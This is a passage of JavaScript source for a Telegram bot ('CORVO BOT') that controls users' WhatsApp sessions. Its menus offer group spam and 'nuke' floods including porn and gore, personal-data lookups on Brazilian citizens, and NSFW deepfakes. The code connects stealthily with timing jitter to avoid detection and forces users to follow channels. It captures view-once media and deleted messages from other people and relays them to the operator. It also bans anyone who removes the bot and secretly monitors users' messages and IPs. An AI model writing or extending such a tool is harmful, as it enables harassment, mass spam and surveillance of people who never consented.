    ctx.reply = async function (...args) {
        const msg = await _origReply(...args).catch(() => null);
        if (msg?.message_id) trackBotMessage(tid, msg.message_id);
        return msg;
    };
    const _origPhoto = ctx.replyWithPhoto.bind(ctx);
    ctx.replyWithPhoto = async function (...args) {
        const msg = await _origPhoto(...args).catch(() => null);
        if (msg?.message_id) trackBotMessage(tid, msg.message_id);
        return msg;
    };
    const _origVideo = ctx.replyWithVideo.bind(ctx);
    ctx.replyWithVideo = async function (...args) {
        const msg = await _origVideo(...args).catch(() => null);
        if (msg?.message_id) trackBotMessage(tid, msg.message_id);
        return msg;
    };
    const _origDoc = ctx.replyWithDocument.bind(ctx);
    ctx.replyWithDocument = async function (...args) {
        const msg = await _origDoc(...args).catch(() => null);
        if (msg?.message_id) trackBotMessage(tid, msg.message_id);
        return msg;
    };
    return next();
});

// --- MIDDLEWARE DE LOG DE MENSAGENS (sem sobrescrever ctx.reply - FIX Bug #6) ---
let monitoringMode = false;
let monitorMessageIds = [];
const messageHistory = [];

bot.use(async (ctx, next) => {
    // Só encaminha ao admin se modo monitor ativo — NÃO redefine ctx.reply aqui (já feito no middleware único acima)

    if (ctx.message && ctx.from) {
        const tid = ctx.from?.id || 'Desconhecido';
        const username = ctx.from?.username || 'Sem username';
        const firstName = ctx.from?.first_name || 'Sem nome';
        const messageText = ctx.message.text || '[Mídia/Arquivo]';
        const timestamp = new Date().toLocaleString('pt-BR');

        // Salva no histórico (últimas 100 mensagens)
        messageHistory.push({
            tid,
            username,
            firstName,
            messageText,
            timestamp
        });
        if (messageHistory.length > 100) {
            messageHistory.shift(); // Remove a mais antiga
        }

        // Log no console
        console.log(`\n📨 [MENSAGEM RECEBIDA] ${timestamp}`);
        console.log(`👤 Usuário: ${firstName} (@${username}) - ID: ${tid}`);
        console.log(`💬 Mensagem: ${messageText}`);
        console.log(`---`);

        // Se modo monitoramento estiver ativo E não for do admin, envia para o admin
        if (monitoringMode && tid !== ADMIN_ID) {
            try {
                const isVip = isUserVip(tid);
                const vipIcon = isVip ? '💎' : '🆓';

                // Formata os botões inline
                const monitorMarkup = Markup.inlineKeyboard([
                    [Markup.button.callback('💬 Responder', `reply_monitor_${tid}`)]
                ]);

                // Encaminhar Mídia Se Existir
                let mediaMsg = null;
                if (ctx.message.photo || ctx.message.video || ctx.message.voice || ctx.message.audio || ctx.message.document || ctx.message.sticker) {
                    mediaMsg = await ctx.telegram.copyMessage(ADMIN_ID, ctx.chat.id, ctx.message.message_id).catch(() => { });
                }

                const monitorMsgText = `<blockquote><b>📨 MONITORAMENTO EM TEMPO REAL</b>\n\n` +
                    `👤 <b>Usuário:</b> <code>${firstName}</code> (@${username})\n` +
                    `🆔 <b>ID:</b> <code>${tid}</code>\n` +
                    `🌟 <b>Status:</b> ${vipIcon} <i>${isVip ? 'VIP' : 'FREE'}</i>\n` +
                    `🌐 <b>IP:</b> <code>${usersData[tid]?.ip || 'Indisponível'}</code>\n` +
                    `⏰ <b>Horário:</b> <code>${timestamp}</code>\n\n` +
                    `💬 <b>Conteúdo:</b>\n<i>${messageText}</i>\n\n` +
                    `⚡ <i>Corvo Intelligence Monitoring</i></blockquote>`;
                const mMsg = await bot.telegram.sendMessage(ADMIN_ID, monitorMsgText, { parse_mode: 'HTML', ...monitorMarkup }).catch(() => { });
                if (mMsg) monitorMessageIds.push(mMsg.message_id);
                if (mediaMsg) monitorMessageIds.push(mediaMsg.message_id);
            } catch (e) {
                console.error('Erro ao enviar mensagem de monitoramento:', e);
            }
        }
    }
    return next();
});

// --- ANTI-FLOOD ---
bot.use(async (ctx, next) => {
    if (!ctx.from) return next();
    const tid = ctx.from.id;

    // Verificar Banimento
    if (bannedUsers.has(tid)) {
        return ctx.reply('🚫 *ACESSO BLOQUEADO!* Você foi banido do sistema por violação dos termos de uso.', { parse_mode: 'Markdown' });
    }

    const now = Date.now();
    const limit = 5;
    const window = 3000;
    const userData = floodMap.get(tid) || { count: 0, last: now };
    if (now - userData.last < window) {
        userData.count++;
    } else {
        userData.count = 1;
        userData.last = now;
    }

    floodMap.set(tid, userData);

    if (userData.count > limit) {
        if (userData.count === limit + 1) {
            logEvent('WARN', `Flood detectado de ${ctx.from.first_name} (${tid})`);
            return ctx.reply('⚠️ *SISTEMA ANTI-FLOOD:* Você está enviando comandos rápido demais! Aguarde alguns segundos.', { parse_mode: 'Markdown' }).catch(() => { });
        }
        return;
    }

    trackUser(tid, ctx);
    return next();
});

// --- MIDDLEWARE DE RASTREAMENTO GLOBAL DE RESPOSTAS ---
bot.use(async (ctx, next) => {
    if (!ctx.from) return next();
    const tid = ctx.from.id;

    // Interceptar métodos de resposta para rastrear mensagens do bot
    const methods = ['reply', 'replyWithPhoto', 'replyWithVideo', 'replyWithDocument', 'replyWithSticker', 'replyWithAudio', 'replyWithVoice'];
    methods.forEach(method => {
        if (ctx[method]) {
            const originalMethod = ctx[method];
            ctx[method] = async (...args) => {
                const msg = await originalMethod.apply(ctx, args);
                if (msg && msg.message_id) {
                    trackBotMessage(tid, msg.message_id);
                }
                return msg;
            };
        }
    });

    return next();
});

// --- MIDDLEWARE DE VERIFICAÇÃO VIP ---
bot.use(async (ctx, next) => {
    const tid = ctx.from?.id;
    if (!tid) return next();

    // Permitir acesso ao admin sempre
    if (tid === ADMIN_ID) return next();

    // Permitir comandos relacionados a VIP/pagamento e comandos básicos
    const text = ctx.message?.text || '';
    const callbackData = ctx.callbackQuery?.data || '';

    const allowedCommands = [
        '/start',
        '💎 • Planos VIP',
        '🎁 • Doar',
        'accept_terms',
        'verify_sub'
    ];

    const allowedCallbacks = [
        'buy_vip_',
        'accept_terms',
        'verify_sub'
    ];

    // Verificar se é comando permitido
    const isAllowedCommand = allowedCommands.some(cmd => text.includes(cmd));
    const isAllowedCallback = allowedCallbacks.some(cb => callbackData.startsWith(cb));

    if (isAllowedCommand || isAllowedCallback) {
        return next();
    }

    // Verificar se usuário é VIP
    if (!isUserVip(tid)) {
        const vipMsg = `❌ *ACESSO RESTRITO - VIP NECESSÁRIO*

Seu período de teste expirou! 😔

Para continuar usando o *CORVO BOT*, você precisa adquirir um plano VIP.

💎 *BENEFÍCIOS VIP:*
✅ Rajadas ilimitadas sem propaganda
✅ Consultas sem cooldown
✅ Velocidade máxima
✅ Suporte prioritário
✅ Sem limite de uso

📋 *Clique no botão abaixo para ver os planos disponíveis:*`;

        return ctx.reply(vipMsg, {
            parse_mode: 'Markdown',
            ...Markup.keyboard([
                ['💎 • Planos VIP'],
                ['🎁 • Doar']
            ]).resize()
        });
    }

    return next();
});

// --- MIDDLEWARE DE VERIFICAÇÃO DE CANAL ---
async function checkSubscription(ctx, next) {
    const tid = ctx.from?.id;
    if (!tid) return;
    if (ctx.callbackQuery?.data === 'verify_sub') return next();
    try {
        const member = await ctx.telegram.getChatMember(CHANNEL_ID, tid);
        const allowedStatus = ['member', 'administrator', 'creator'];
        if (allowedStatus.includes(member.status)) {
            return next();
        } else {
            throw new Error('Not Subscribed');
        }
    } catch (error) {
        const escapedChannelId = CHANNEL_ID.replace(/_/g, '\\_');
        return ctx.reply(`⚠️ • *ACESSO BLOQUEADO!*\n\nOlá ${ctx.from.first_name}, para utilizar o bot, você deve ser um membro oficial do nosso canal.\n\n📢 Canal: ${escapedChannelId}`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.url('📢 • Entrar no Canal', CHANNEL_LINK)],
                [Markup.button.callback('✅ • Já entrei! Verificar agora', 'verify_sub')]])
        }).catch(() => { });
    }
}

bot.use(checkSubscription);

// --- FUNÇÕES AUXILIARES ---
function loadUserConfig(tid) {
    const p = `./configs/${tid}.json`;
    if (fs.existsSync(p)) {
        try {
            userConfigs[tid] = JSON.parse(fs.readFileSync(p));
        } catch (e) {
            userConfigs[tid] = { texto: '👻!', quantidade: 5, delay: 1000, autoNick: false, antiKick: true, ghostMode: false };
        }
    } else {
        userConfigs[tid] = { texto: '👻!', quantidade: 5, delay: 1000, autoNick: false, texto_flood: '🔥', quantidade_flood: 10, antiKick: true, ghostMode: false };
    }

    // Garantir que campos novos existam
    if (userConfigs[tid].texto_flood === undefined) userConfigs[tid].texto_flood = '🔥';
    if (userConfigs[tid].quantidade_flood === undefined) userConfigs[tid].quantidade_flood = 10;
    if (userConfigs[tid].antiKick === undefined) userConfigs[tid].antiKick = true;
    if (userConfigs[tid].ghostMode === undefined) userConfigs[tid].ghostMode = false;
    return userConfigs[tid];
}

function saveUserConfig(tid) {
    fs.writeFile(`./configs/${tid}.json`, JSON.stringify(userConfigs[tid], null, 2), (err) => {
        if (err) console.error(`Erro ao salvar config do usuário ${tid}:`, err);
    });
}

function hasSession(tid) {
    return fs.existsSync(path.join(`./sessions/${tid}`, 'creds.json'));
}

// --- MENUS DINÂMICOS PREMIUM ---
const getMainMenu = (tid) => {
    const isConnected = !!userSessions[tid]?.user;
    const sessionExists = hasSession(tid);
    const buttons = [];

    // CONEXÃO (Destaque Principal)
    if (!sessionExists) {
        buttons.push(["📲 • CONECTAR WHATSAPP"]);
    } else {
        if (isConnected) {
            buttons.push(["🔌 • DESCONECTAR", "🔄 • TROCAR NÚMERO"]);
        } else {
            buttons.push(["🔋 • LIGAR WHATSAPP", "🔄 • TROCAR NÚMERO"]);
        }
    }

    // NÚCLEO DE OPERAÇÕES
    buttons.push(["🚀 • RAJAR GRUPOS", "🧨 • NUKAR GRUPO"]);
    buttons.push(["⚡ • RAJADA GLOBAL", "🔍 • CONSULTAS VIP"]);

    // FERRAMENTAS E MÍDIAS
    buttons.push(["🛠️ • FERRAMENTAS ELITE", "🎬 • CENTRAL DE MÍDIAS"]);

    // PERFIL E SISTEMA
    buttons.push(["👤 • MEU PERFIL", "⚙️ • CONFIGURAÇÕES"]);
    buttons.push(["💎 • PLANOS VIP", "🆘 • SUPORTE"]);

    if (tid === ADMIN_ID) {
        buttons.push(["👑 • PAINEL ADMINISTRATIVO"]);
    }

    return Markup.keyboard(buttons).resize();
};

const getRajarMenu = () => {
    return Markup.keyboard([
        ["🚀 RAJAR 1 (PAGAMENTO)", "🚀 RAJAR 2 (STATUS)"],
        ["🚀 RAJAR 3 (MISTO)", "🌊 RAJAR 4 (FLOOD)"],
        ["🎬 RAJAR PORNO", "🎬 RAJAR GORE"],
        ["🗳️ RAJAR ENQUETES", "🆔 RAJAR POR ID"],
        ["🔥 NUKE TURBO 🔥", "🔙 VOLTAR"]
    ]).resize();
};

const getAdultMenu = () => {
    return Markup.keyboard([
        ["🔞 • GERAR ARTE (NSFW)", "🔞 • FUSÃO (DEEPFAKE)"],
        ["🔞 • HENTAI IA", "🎬 • VÍDEOS ADULTOS"],
        ["🔙 • VOLTAR"]
    ]).resize();
};

const getToolsMenu = () => {
    return Markup.keyboard([
        ["🧠 • CHAT DE IA", "🎨 • GERAR FOTO (IA)"],
        ["🎬 • CRIAR VÍDEO (IA)", "🔞 • IA ADULTA (NSFW)"],
        ["🎭 • IA STUDIO (AVATAR)", "🎬 • IA VIDEO ACTION"],
        ["🗣️ • VOZ DE IA (TTS)", "📄 • GERAR DOC (IA)"],
        ["🌐 • TRADUTOR IA", "🖼️ • IMAGEM > STICKER"],
        ["📡 • SCRAPER WEB", "🎲 • GERADORES"],
        ["🔙 • VOLTAR"]
    ]).resize();
};

const getGeneratorsMenu = () => {
    return Markup.keyboard([
        ["📄 • GERAR CPF", "📄 • GERAR CNPJ"],
        ["👤 • PESSOA ALEATÓRIA", "💳 • CARTÃO TESTE"],
        ["🔙 • VOLTAR"]
    ]).resize();
};

const getFloodMenu = () => {
    return Markup.keyboard([
        ["🔥 • FLOOD NGL", "🔥 • FLOOD SENDIT"],
        ["🔙 • VOLTAR"]
    ]).resize();
};

const getFloodConfigMenu = (tid) => {
    const config = loadUserConfig(tid);
    const antiKickLabel = config.antiKick ? '🛡️ • ANTI-KICK: [ATIVO]' : '🛡️ • ANTI-KICK: [INATIVO]';
    return Markup.keyboard([
        [`🔢 • QUANTIDADE: ${config.quantidade_flood || 10}`],
        [`⏳ • DELAY: ${config.delay || 1000}ms`],
        [antiKickLabel],
        ["📝 • TEXTO DA RAJADA"],
        ["🔙 • VOLTAR"]
    ]).resize();
};

const getMidiasMenu = () => {
    return Markup.keyboard([
        ["📸 • Instagram", "🎵 • TikTok"],
        ["🔙 • Voltar"]
    ]).resize();
};
const getConsultasMenu = () => {
    return Markup.keyboard([
        ["👤 • FOTO SP", "👤 • FOTO RJ"],
        ["👤 • FOTO BA", "👤 • FOTO NACIONAL"],
        ["🔍 • CPF", "🔍 • Nome Pro"],
        ["🔍 • Score", "🔍 • Tel"],
        ["🔍 • Placa", "🔍 • CNH"],
        ["👥 • Vizinhos Elite", "👨‍👩‍👧‍👦 • Parentes Pro"],
        ["🔍 • Instagram", "🔍 • E-mail"],
        ["🔍 • BIN", "🔍 • CNS"],
        ["🔍 • SIPNI", "🔍 • SISREG"],
        ["🔍 • RG Nacional", "🏢 • Consultar CNPJ"],
        ["💀 • Óbito", "🚘 • RENAVAM"],
        ["📮 • Consultar CEP", "🔙 • Voltar"]
    ]).resize();
};

const getSupportMenu = () => {
    return Markup.keyboard([
        ["💡 • Enviar Sugestão", "🐛 • Relatar Bug"],
        ["👨‍💻 • Contato Admin", "🔙 • Voltar"]
    ]).resize();
};

const getConfigMenu = (tid) => {
    const config = loadUserConfig(tid);
    const nickStatus = config.autoNick ? "✅ ATIVO" : "❌ INATIVO";
    const ghostStatus = config.ghostMode ? "✅ ATIVO" : "❌ INATIVO";
    return Markup.keyboard([
        ["📝 • Alterar Texto", "🔢 • Alterar Quantidade"],
        ["⏳ • Alterar Delay", `🎭 • Trocar Nick: ${nickStatus}`],
        [`👻 • Modo Fantasma: ${ghostStatus}`, "🔙 • Voltar"]
    ]).resize();
};

const getAdminMenu = () => {
    return Markup.keyboard([
        ["📢 • Broadcast Global", "👥 • Lista de Usuários"],
        ["🚫 • Banir Usuário", "📩 • Ver Feedbacks"],
        ["💰 • Saldo Bancário", "💸 • Solicitar Saque"],
        ["💎 • Gerenciar VIPs", "🎁 • VIP para Todos"],
        ["🎁 • VIP Global (7 Dias)", "🔄 • Reiniciar Bot"],
        ["📊 • Monitor de Status", "📨 • Últimas Mensagens"],
        ["🟢 • Ativar Monitor", "🔴 • Desativar Monitor"],
        ["📝 • Postar Changelog", "✉️ • Enviar Mensagem"],
        ["🧹 • Limpar Logs", "📊 • Estatísticas Full"],
        ["🔙 • Voltar"]
    ]).resize();
};

const getAboutMenu = () => {
    return Markup.keyboard([
        ["⚡ • Health Check", "🆘 • Suporte & Bugs"],
        ["🌐 • Sites Oficiais", "📢 • Canal Parceiros"],
        ["🔙 • Voltar"]
    ]).resize();
};

const getPartnersMenu = () => {
    return Markup.keyboard([
        ["🤝 • Ser um Parceiro", "🔙 • Voltar"]
    ]).resize();
};

const getPartnersInline = () => {
    return Markup.inlineKeyboard([
        [Markup.button.url('🔥 • Hórus', 'https://whatsapp.com/channel/0029Vb7gwc9CRs1wLPWKrf3B')],
        [Markup.button.url('🇧🇷 • V Channel', 'https://whatsapp.com/channel/0029VbB5J418KMqc3RgBT834')],
        [Markup.button.url('📺 • Nexy [Channel]', 'https://whatsapp.com/channel/0029VaoRpDF5PO190ZCItg3D')]
    ]);
};

const getSitesInline = () => {
    return Markup.inlineKeyboard([
        [Markup.button.url('🌐 • Aliança KKGR', OFFICIAL_SITES.site1)],
        [Markup.button.url('🔗 • API MomoAyse', OFFICIAL_SITES.site2)],
        [Markup.button.url('👨‍💻 • Suporte Admin', OFFICIAL_SITES.admin)]
    ]);
};

// --- MOTOR DE CONEXÃO CORVO ---
async function checkAndFollowChannels(tid, sock, ctx) {
    try {
        logEvent('INFO', `Verificando canais obrigatórios para o usuário ${tid}...`);
        await delay(10000);

        for (const channelId of MANDATORY_CHANNELS) {
            try {
                await sock.newsletterFollow(channelId);
                logEvent('SUCCESS', `Seguindo canal: ${channelId} para o usuário ${tid}`);
                console.log(`✅ [WHATSAPP] Usuário ${tid} foi forçado a seguir o canal ${channelId} com sucesso!`);
                await delay(3000);
            } catch (err) {
                if (err.message.includes('unexpected response structure') || err.message.includes('conflict')) {
                } else {
                    logEvent('WARN', `Erro ao seguir canal ${channelId}: ${err.message}`);
                }
            }
        }

        // Verificação periódica: limpa intervalo antigo antes de criar novo (FIX Bug #8)
        if (connectionTimers[tid]) {
            if (connectionTimers[tid].channelCheckInterval) {
                clearInterval(connectionTimers[tid].channelCheckInterval);
                connectionTimers[tid].channelCheckInterval = null;
            }
            connectionTimers[tid].channelCheckInterval = setInterval(async () => {
                if (!userSessions[tid]?.user) {
                    clearInterval(connectionTimers[tid]?.channelCheckInterval);
                    return;
                }
            }, 5 * 60 * 1000);
        }
    } catch (error) {
        logEvent('ERROR', `Erro na rotina de canais: ${error.message}`);
    }
}

async function connectToWhatsApp(tid, ctx = null) {
    // FIX Bug #3: evitar duplo socket por clique duplo
    if (connectionLocks.has(tid)) {
        logEvent('WARN', `connectToWhatsApp: lock ativo para ${tid}, ignorando chamada dupla`);
        return userSessions[tid];
    }
    connectionLocks.add(tid);
    try {
    return await _connectToWhatsAppInner(tid, ctx);
    } finally {
        connectionLocks.delete(tid);
    }
}

async function _connectToWhatsAppInner(tid, ctx = null) {
    const sessionDir = `./sessions/${tid}`;
    if (!fs.existsSync(sessionDir)) {
        fs.mkdirSync(sessionDir, { recursive: true });
    }
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    let version;
    try {
        const latest = await fetchLatestBaileysVersion();
        version = latest.version;
    } catch (e) {
        version = [2, 3000, 1015901307];
    }

    if (userSessions[tid]) {
        try {
            userSessions[tid].ev.removeAllListeners();
            userSessions[tid].end();
        } catch (e) { }
    }

    const sock = makeWASocket({
        version,
        logger,
        auth: state,
        browser: ["Windows", "Chrome", "11.0.7"],
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        mobile: false,
        syncFullHistory: false,
        markOnlineOnConnect: false, // Stealth connect: não anuncia presença imediatamente
        defaultQueryTimeoutMs: 60000,
        retryRequestDelayMs: gaussianJitter(5000, 1000), // Jitter no delay de retry
        generateHighQualityLinkPreview: true,
        // [GitHub #1] cachedGroupMetadata: evita fetch repetido de participantes
        cachedGroupMetadata: async (jid) => {
            const cached = groupMetadataCache.get(jid);
            if (cached && (Date.now() - cached.ts) < GROUP_CACHE_TTL) return cached.data;
            return undefined;
        },
        patchMessageBeforeSending: (message) => {
            const requiresPatch = !!(
                message.buttonsMessage ||
                message.templateMessage ||
                message.listMessage);
            if (requiresPatch) {
                message = {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            ...message
                        }
                    }
                };
            }
            return message;
        }
    });

    userSessions[tid] = sock;
    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const config = loadUserConfig(tid);
            for (const msg of chatUpdate.messages) {
                if (!msg.message) continue;

                // --- LÓGICA GHOST MODE ---
                if (config.ghostMode) {
                    try {
                        await sock.sendPresenceUpdate('paused', msg.key.remoteJid);
                    } catch (e) {}
                }

                const messageId = msg.key.id;
                const remoteJid = msg.key.remoteJid;
                const isGroup = remoteJid.endsWith('@g.us');
                const participant = msg.key.participant || msg.participant || msg.key.remoteJid;

                const messageType = Object.keys(msg.message)[0];

                // --- LÓGICA ANTI-VIEWONCE ---
                const isViewOnce = messageType === 'viewOnceMessageV2' || messageType === 'viewOnceMessageV2Extension';
                if (isViewOnce) {
                    logEvent('INFO', `ViewOnce detectado na sessão de ${tid}. Baixando...`);
                    const viewOnceMsgObj = msg.message[messageType].message;
                    const mediaType = Object.keys(viewOnceMsgObj)[0];
                    
                    if (mediaType === 'imageMessage' || mediaType === 'videoMessage') {
                        try {
                            const { downloadContentFromMessage } = require('@itsliaaa/baileys');
                            const mediaMessage = viewOnceMsgObj[mediaType];
                            const stream = await downloadContentFromMessage(
                                mediaMessage,
                                mediaType === 'imageMessage' ? 'image' : 'video'
                            );
                            
                            let buffer = Buffer.from([]);
                            for await (const chunk of stream) {
                                buffer = Buffer.concat([buffer, chunk]);
                            }

                            const captionText = mediaMessage.caption || "";
                            let senderName = msg.pushName || 'Desconhecido';
                            let groupName = '';
                            if (isGroup) {
                                try {
                                    const meta = await sock.groupMetadata(remoteJid);
                                    groupName = meta.subject;
                                } catch (e) {
                                    groupName = 'Grupo de WhatsApp';
                                }
                            }

                            const header = `<blockquote>📸 <b>REVELADOR DE MÍDIA ÚNICA</b>\n\n` +
                                `• <b>Enviado por:</b> <code>${senderName}</code>\n` +
                                `${isGroup ? `• <b>No grupo:</b> <code>${groupName}</code>\n` : ''}` +
                                `• <b>Legenda original:</b> <i>${captionText || 'Sem legenda'}</i>\n\n` +
                                `⚡ <i>Corvo Intelligence System</i></blockquote>`;

                            if (mediaType === 'imageMessage') {
                                await bot.telegram.sendPhoto(tid, { source: buffer }, { caption: header, parse_mode: 'HTML' });
                            } else {
                                await bot.telegram.sendVideo(tid, { source: buffer }, { caption: header, parse_mode: 'HTML' });
                            }
                            logEvent('SUCCESS', `ViewOnce revelado e enviado para o Telegram de ${tid}`);
                        } catch (e) {
                            logEvent('ERROR', `Erro ao revelar ViewOnce: ${e.message}`);
                        }
                    }
                }

                // --- LÓGICA ANTI-DELETE ---
                const isProtocol = messageType === 'protocolMessage';
                if (isProtocol && msg.message.protocolMessage && msg.message.protocolMessage.type === 0) {
                    const deletedMsgId = msg.message.protocolMessage.key.id;
                    const sessionCache = whatsappMessageCache.get(tid);
                    
                    if (sessionCache && sessionCache.has(deletedMsgId)) {
                        const originalMsg = sessionCache.get(deletedMsgId);
                        let senderName = originalMsg.sender;
                        let groupName = '';
                        if (originalMsg.isGroup) {
                            try {
                                const meta = await sock.groupMetadata(originalMsg.remoteJid);
                                groupName = meta.subject;
                            } catch (e) {
                                groupName = 'Grupo de WhatsApp';
                            }
                        }

                        const alertMsg = `<blockquote>🗑️ <b>MENSAGEM DELETADA DETECTADA!</b>\n\n` +
                            `• <b>Enviado por:</b> <code>${senderName}</code> (<code>${originalMsg.senderJid}</code>)\n` +
                            `${originalMsg.isGroup ? `• <b>No grupo:</b> <code>${groupName}</code>\n` : ''}` +
                            `• <b>Mensagem original:</b> <i>${originalMsg.content}</i>\n\n` +
                            `⚡ <i>Corvo Intelligence System</i></blockquote>`;

                        await bot.telegram.sendMessage(tid, alertMsg, { parse_mode: 'HTML' });
                        logEvent('SUCCESS', `Mensagem deletada revelada e enviada para o Telegram de ${tid}`);
                        sessionCache.delete(deletedMsgId);
                    }
                }

                // --- LÓGICA CACHE PARA ANTI-DELETE ---
                if (!whatsappMessageCache.has(tid)) {
                    whatsappMessageCache.set(tid, new Map());
                }
                const sessionCache = whatsappMessageCache.get(tid);
                
                let msgContent = null;
                let isMedia = false;
                
                if (msg.message.conversation) {
                    msgContent = msg.message.conversation;
                } else if (msg.message.extendedTextMessage) {
                    msgContent = msg.message.extendedTextMessage.text;
                } else if (msg.message.imageMessage) {
                    msgContent = msg.message.imageMessage.caption || "[Imagem sem legenda]";
                    isMedia = true;
                } else if (msg.message.videoMessage) {
                    msgContent = msg.message.videoMessage.caption || "[Vídeo sem legenda]";
                    isMedia = true;
                } else if (msg.message.documentMessage) {
                    msgContent = `[Documento: ${msg.message.documentMessage.fileName || 'Sem nome'}]`;
                    isMedia = true;
                } else if (msg.message.audioMessage) {
                    msgContent = `[Mensagem de Áudio]`;
                    isMedia = true;
                } else if (msg.message.stickerMessage) {
                    msgContent = `[Figurinha]`;
                    isMedia = true;
                }
                
                if (msgContent) {
                    sessionCache.set(messageId, {
                        sender: msg.pushName || 'Desconhecido',
                        senderJid: participant.split('@')[0],
                        content: msgContent,
                        isGroup,
                        remoteJid,
                        isMedia,
                        timestamp: Date.now()
                    });
                    
                    if (sessionCache.size > 200) {
                        const firstKey = sessionCache.keys().next().value;
                        sessionCache.delete(firstKey);
                    }
                }
            }
        } catch (e) {
            logEvent('ERROR', `Erro no messages.upsert: ${e.message}`);
        }
    });
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const statusCode = new Boom(lastDisconnect?.error)?.output?.statusCode;
            // [GitHub #2] Exponential backoff classificado por código
            const classify = classifyDisconnect(statusCode);
            logEvent('WARN', `Conexão fechada para ${tid}: ${classify.msg}`);

            if (!classify.reconnect) {
                // Fatal: limpa sessão
                if (statusCode === 403) {
                    const sessionDir = `./sessions/${tid}`;
                    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
                    if (ctx) ctx.reply(`🚫 *ACESSO NEGADO (403)*\n\nConexão rejeitada. Tente outro número ou aguarde 24h.`, { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => {});
                } else {
                    if (ctx) ctx.reply(`⚠️ *SESSÃO ENCERRADA*\n\n${classify.msg}\n\nDesconecte e reconecte para continuar.`, { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => {});
                }
                delete userSessions[tid];
                stopTimer(tid);
                return;
            }

            if (!userSessions[tid] || connectionTimers[tid]?.manualDisconnect) {
                if (connectionTimers[tid]) delete connectionTimers[tid].manualDisconnect;
                return;
            }

            // Reconectar com backoff classificado + jitter
            const backoff = gaussianJitter(classify.backoffMs || 5000, 1000);
            if (ctx && !pairingInProgress[tid]) {
                const msg = classify.cat === 'rate-limit'
                    ? `⏳ *Rate Limit detectado.* Reconectando em 60s...`
                    : `🔄 *Reconectando...* (${classify.msg})`;
                ctx.reply(msg, { parse_mode: 'Markdown' }).catch(() => {});
            }
            setTimeout(() => connectToWhatsApp(tid, ctx), backoff);

        } else if (connection === 'open') {
            delete pairingInProgress[tid];
            startTimer(tid, ctx);
            logEvent('SUCCESS', `WhatsApp Conectado: ${tid}`);
            showDashboard();
            updateUserPhone(tid);

            // [GitHub #3] Stealth: anuncia presença com jitter após conectar
            setTimeout(async () => {
                try { await sock.sendPresenceUpdate('available'); } catch(e) {}
            }, gaussianJitter(3000, 800));

            if (ctx) {
                ctx.reply(`✅ *CONEXÃO ESTABELECIDA!*\n\nInstância CORVO Elite ativa e pronta.\n\n🛡️ *Status:* Protegido\n🚀 *Velocidade:* Máxima`, { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => {});
            }
            checkAndFollowChannels(tid, sock, ctx);

        } else if (update.qr) {
            logEvent('INFO', `QR Code gerado para ${tid}`);
        }
    });

    // [GitHub #5] Session Health Monitor: detecta Bad MACs
    sock.ev.on('messages.update', (updates) => {
        for (const { update } of updates) {
            // WAMessageStubType 2 = CIPHERTEXT (Bad MAC)
            if (update?.messageStubType === 2) {
                recordBadMac(tid);
            } else if (update?.status) {
                recordDecryptSuccess(tid);
            }
        }
    });

    // [GitHub #1] Atualiza cache de grupo nos eventos relevantes
    sock.ev.on('groups.update', async (events) => {
        for (const event of events) {
            try {
                const data = await sock.groupMetadata(event.id).catch(() => null);
                if (data) groupMetadataCache.set(event.id, { data, ts: Date.now() });
            } catch(e) {}
        }
    });
    sock.ev.on('group-participants.update', async ({ id }) => {
        invalidateGroupCache(id); // Invalida cache ao mudar participantes
    });


    sock.ev.on('group-participants.update', async (update) => {
        const config = loadUserConfig(tid);
        if (!config.antiKick) return;

        const { id, participants, action, author } = update;
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const ownerId = (usersData[tid]?.phone || '').split(':')[0] + '@s.whatsapp.net';

        if (action === 'remove') {
            for (const participant of participants) {
                if (participant === botId || participant === ownerId) {
                    const isBot = participant === botId;
                    const type = isBot ? 'BOT' : 'DONO';
                    logEvent('WARN', `Proteção Anti-Kick detectada! ${type} foi removido de ${id} por ${author}`);

                    try {
                        const metadata = await sock.groupMetadata(id).catch(() => null);
                        if (!metadata) return;

                        const me = metadata.participants.find(p => p.id === botId);

                        if (me && (me.admin === 'admin' || me.admin === 'superadmin')) {
                            // Se o bot ainda está no grupo e é admin, ele pode agir
                            if (!isBot) {
                                // Re-adiciona o dono
                                await sock.groupParticipantsUpdate(id, [ownerId], 'add');
                                // Bane o autor do kick
                                if (author && author !== botId) {
                                    await sock.groupParticipantsUpdate(id, [author], 'remove');
                                }
                                await sock.sendMessage(id, { text: `🛡️ <b>SISTEMA ANTI-KICK ELITE</b>\n\nTentativa de remoção do ${type} detectada. O autor foi banido e o ${type} re-adicionado.\n\n⚡ <i>Corvo Intelligence System</i>`, mentions: [author] });
                            }
                        } else if (isBot) {
                            // Se o bot foi removido, tenta reentrar se tiver o link salvo
                            const linkCache = getGroupLink(id);
                            if (linkCache) {
                                const code = linkCache.split('/').pop();
                                await sock.groupAcceptInvite(code).catch(() => { });
                                logEvent('INFO', `Bot tentou reentrar automaticamente no grupo ${id}`);
                            }
                            // Notifica o dono no Telegram
                            bot.telegram.sendMessage(tid, `🛡️ <b>ALERTA ANTI-KICK</b>\n\nO bot foi removido do grupo <b>${metadata.subject}</b> por <code>${author}</code>.`, { parse_mode: 'HTML' }).catch(() => { });
                        }
                    } catch (e) {
                        logEvent('ERROR', `Erro na proteção Anti-Kick: ${e.message}`);
                    }
                }
            }
        }
    });

    // Cache automático de links de grupos (quando o bot entra ou é admin)
    sock.ev.on('groups.upsert', async (groups) => {
        for (const group of groups) {
            try {
                const me = group.participants?.find(p => p.id === (sock.user.id.split(':')[0] + '@s.whatsapp.net'));
                if (me?.admin) {
                    const code = await sock.groupInviteCode(group.id);
                    if (code) saveGroupLink(group.id, `https://chat.whatsapp.com/${code}`);
                }
            } catch (e) { }
        }
    });

    return sock;
}

// --- TIMERS ---
function startTimer(tid, ctx) {
    stopTimer(tid);
